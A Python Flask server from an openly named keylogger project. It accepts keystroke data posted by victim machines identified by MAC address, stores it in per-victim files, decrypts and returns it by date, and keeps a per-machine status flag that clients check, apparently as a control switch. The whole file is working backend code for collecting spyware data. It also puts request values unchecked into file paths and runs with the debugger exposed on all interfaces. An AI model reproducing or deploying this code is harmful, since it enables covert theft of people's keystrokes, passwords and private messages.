from flask import Flask, render_template, Blueprint, jsonify, request
import requests
import json
import time
from flask_cors import CORS
from getmac import get_mac_address

from KEYLOGGER_PROJECT.Encrypt_Decrypt.decrypt_file import Decrypt



with open(r'C:\Users\User\Desktop/keylogger_data/Mac_status.json', 'w') as f:
    json.dump({'flask':True}, f)


app = Flask(__name__)
CORS(app)


@app.route('/', methods=['GET'])
def hello():
    mac_address = request.args['mac']
    date_input = request.args['date']
    print(date_input)
    with open(fr"C:\Users\User\Desktop\{mac_address.replace(':','-')}.json", 'rb') as f:
        try:
            key=Decrypt.get_key(mac_address)
            dic = dict(Decrypt.decrypt_data(f.read(), key))[mac_address][date_input]
            return str(dic)
        except Exception as e:
            return jsonify({'invalid mac address': e})


@app.route('/add_data', methods=['POST'])
def add_data():
    dict_data = dict(request.json)
    print(dict_data)
    data = dict_data['data'].encode()
    mac = dict_data['mac']
    with open(fr'C:\Users\User\Desktop\keylogger_data\{mac.replace(':', '-')}.json', 'ab') as f:
        print('yesssss',data)
        f.write(data)
        return jsonify({'post':'successful','if exit':'False'}), 200


@app.route('/send_mac', methods=['POST'])
def send_mac():
    mac = request.data
    with open(r'C:\Users\User\Desktop/keylogger_data/Mac_status.json', 'r') as f:
        dict_f = json.loads(f.read())
        dict_f[mac.decode()] = True
        with open(r'C:\Users\User\Desktop/keylogger_data/Mac_status.json', 'w') as file:
            json.dump(dict_f, file)
        print(mac.decode())
    return jsonify({'post':'successful'}), 200


@app.route('/check_status', methods=['GET'])
def check_status():
    mac = request.args.get('mac')
    if mac:
        with open(r'C:\Users\User\Desktop/keylogger_data/Mac_status.json', 'r') as f:
            dic_status = json.loads(f.read())
            print(dic_status)
            if dic_status[mac] == False:
                return jsonify({'get':'successful'}), 400
    return jsonify({'get':'not successful'}), 200




app.run(debug=True, host='0.0.0.0')